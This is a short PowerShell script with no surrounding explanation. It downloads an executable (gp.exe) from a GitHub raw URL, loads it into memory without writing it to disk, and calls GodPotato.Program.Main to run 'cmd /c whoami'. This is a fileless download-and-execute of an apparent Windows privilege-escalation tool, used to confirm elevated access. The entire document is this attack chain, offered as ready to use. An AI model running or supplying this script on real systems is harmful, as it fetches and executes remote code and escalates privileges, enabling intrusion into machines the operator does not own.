[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
$u="https://raw.githubusercontent.com/bimhybim-del/ai/main/gp.exe"
$wc=New-Object Net.WebClient
$b=$wc.DownloadData($u)
Write-Host "DL OK: $($b.Length) bytes"
$a=[Reflection.Assembly]::Load($b)
Write-Host "ASM: $($a.FullName)"
$t=$a.GetType("GodPotato.Program")
$m=$t.GetMethod("Main")
$r=$m.Invoke($null, @(,@("-cmd","cmd /c whoami")))
Write-Host "RESULT: $r"
